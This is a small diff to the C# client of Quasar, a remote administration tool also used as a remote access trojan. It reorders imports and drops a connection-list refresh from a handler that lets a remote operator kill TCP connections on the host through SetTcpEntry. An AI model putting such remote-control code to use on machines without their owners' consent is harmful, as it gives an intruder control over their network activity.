@@ -1,10 +1,10 @@
-﻿using System;
+﻿using Quasar.Common.Enums;
+using Quasar.Common.Messages;
+using Quasar.Common.Models;
+using System;
 using System.Diagnostics;
 using System.Net;
 using System.Runtime.InteropServices;
-using Quasar.Common.Enums;
-using Quasar.Common.Messages;
-using Quasar.Common.Models;
 using xClient.Core.Networking;
 
 namespace xClient.Core.Commands
@@ -47,7 +47,6 @@ namespace xClient.Core.Commands
         public static void HandleDoCloseConnection(Client client, DoCloseConnection packet)
         {
             var table = GetTable();
-            var matchFound = false;
 
             for (var i = 0; i < table.Length; i++)
             {
@@ -58,18 +57,12 @@ namespace xClient.Core.Commands
                     packet.RemotePort== table[i].RemotePort)
                 {
                     // it will close the connection only if client run as admin
-                    matchFound = true;
                     //table[i].state = (byte)ConnectionStates.Delete_TCB;
                     table[i].state = 12; // 12 for Delete_TCB state
                     var ptr = Marshal.AllocCoTaskMem(Marshal.SizeOf(table[i]));
                     Marshal.StructureToPtr(table[i], ptr, false);
                     SetTcpEntry(ptr);
                 }
-            }
-
-            if (matchFound)
-            {
-                HandleGetConnections(client, new GetConnections());
             }
         }
 
